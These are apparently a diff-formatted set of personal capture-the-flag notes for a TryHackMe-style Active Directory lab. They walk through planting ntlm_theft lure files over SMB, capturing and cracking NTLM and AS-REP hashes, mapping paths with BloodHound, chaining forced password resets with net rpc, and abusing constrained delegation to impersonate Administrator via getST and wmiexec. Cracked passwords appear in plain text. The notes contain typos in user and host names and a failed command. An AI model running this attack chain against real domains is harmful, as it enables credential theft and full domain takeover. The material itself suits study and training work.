@@ -1,0 +1,112 @@
+139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
+
+In smb, prompt false command makes you not to do (yes or no).
+--------------------------------------------------------------
+
+smb: \onboarding\> prompt false
+smb: \onboarding\> mget *
+
+NTLM_theft
+------------
+ntlm_theft is an Open Source Python3 Tool that generates 21 different types of NTLM2_hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.
+
+#python3 ntlm_theft.py -g all -s $YOUR_IP -f test(customized file)
+
+
+we should start the Responder to listen for the traffic we are about to stage
+
+#sudo responder -I tun0 -v
+
+Now, let’s Upload with mput the contents we generated with the ntlm_theft 
+
+smb: \onboarding\> prompt false
+smb: \onboarding\> mput *
+
+AUTOMATE::THM:21ff6ce3be4f3442:F271A81B8CFC4838328C7D4106FE23B1:010100000000000080ADB850278EDA01E92B64E92A8D4AF300000000020008004F0053004E00530001001E00570049004E002D00320039005A005A00380033003900550048004B00380004003400570049004E002D00320039005A005A00380033003900550048004B0038002E004F0053004E0053002E004C004F00430041004C00030014004F0053004E0053002E004C004F00430041004C00050014004F0053004E0053002E004C004F00430041004C000700080080ADB850278EDA0106000400020000000800300030000000000000000100000000200000200E3851A0638870C07A52C265B115DEA1370EA4ADD824D80E2B0D4D90C842800A001000000000000000000000000000000000000900200063006900660073002F00310030002E0034002E00370033002E003100370036000000000000000000
+
+AUTOMATE:Passw0rd1
+
+*****If ldap port is open, you can try ldapsearch and bloodhound******
+
+#ldapsearch -H ldap://10.10.218.170 -x -D "AUTOMATE@thm.corp" -w 'Passw0rd1' -b "DC=thm,DC=corp" | tee ldap.txt
+#grep user ldap.txt
+
+sudo neo4j console
+
+
+#impacket-GetNPUsers thm.corp/AUTOMATE
+
+
+TABATHA_BRITT
+
+[*] Cannot authenticate TABATHA_BRITT, getting its TGT
+$krb5asrep$23$TABATHA_BRITT@THM.CORP:88bc0552a1d6af2e9208f4a4dc871fac$fa5280eb09c95daf2719a837a405f961b7b4a6bb3c5088b5de13d4379ced8342e075a26d9a6900ae30df7d152b6dcf1775b28f861f78598e5af79f4af2e5d7e4b68cca20be03d08b5cd30dae09503f7c990404241f3470900bd6fde94eb21c8d9d412200a24b1cc5ca5fd20f5a196846d6b1499eba414411e96af68b792f24bd5c5917a7716af0dfaa9d2b36f058b80b35037053ee8903f841647001a91e1db09d455b2cb71087672ff1038494d2bb4becd18ebd88139c6d469db898acedb92e48569ee3f23d2a7063a3a272d29cbe917c269f0f8713be5c9ebc20a6a96fac11e21b12b1
+
+
+
+TABATHA_BRITT:marlboro(1985)
+
+
+
+#bloodhound-python -d thm.corp -u TABATHA_BRITT -p 'marlboro(1985)' -ns 10.10.24.189 -c All
+
+
+In order to open Bloodhound
+---------------------------
+1.sudo neo4j console (localhost:7474)
+2.open bloodhound (username and password from neo4j)
+
+
+TABATHA_BRITT ---> SHAWNA_BAY
+
+SHAWNA_BAY --> CRUZ_HALL
+
+CRUZ_HALL --> DARLA_WINTERS
+
+
+
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+--------------------------------------------------------------------------------------------------------------
+
+net rpc password "SHAWNA_BRAY" "newP@ssword2025" -U "thm.corp"/"TABATHA_BRITT"%"marlboro(1985)" -S "haystack.thm.corp"
+
+net rpc password "CRUZ_HALL" "newP@ssword2023" -U "THM.CORP"/"SHAWNA_BRAY"%"newP@ssword2025" -S "10.10.247.211"
+
+net rpc password "DARLA_WINTERS" "newP@ssword2024" -U "DOMAIN"/"CRUZ_HALL"%"newP@ssword2023" -S "10.10.247.211"
+
+
+Confirm login sucess with darla_winters
+----------------------------------------
+
+
+#crackmapexec smb 10.10.247.211 -u DARLA_WINTERS -p newP@ssword2024 --continue-on-success
+
+
+Bloodhound to Darla_winters
+
+
+Allowed To Delegate	cifs/HayStack.thm.corp/thm.corp
+cifs/HayStack.thm.corp
+cifs/HAYSTACK
+cifs/HayStack.thm.corp/THM
+cifs/HAYSTACK/THM
+
+to generate Admin.ccache
+--------------------------
+
+#ntpdate -s thm.corp
+impacket-getST -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS:newP@ssword2024
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[Errno 2] No such file or directory: 'Administrator.ccache
+
+
+#python3 getST.py -spn cifs/HayStack.thm.corp -dc-ip 10.10.247.211 -impersonate Administrator THM.CORP/DARLA_WINTERS:newP@ssword2024
+
+
+Now, we shall use this with the KRB5CCNAME: our kerberos default ccache name attribute…
+
+
+export KRB5CCNAME=Administrator.ccache
+wmiexec.py -k -no-pass Administrator@heystack.thm.corp
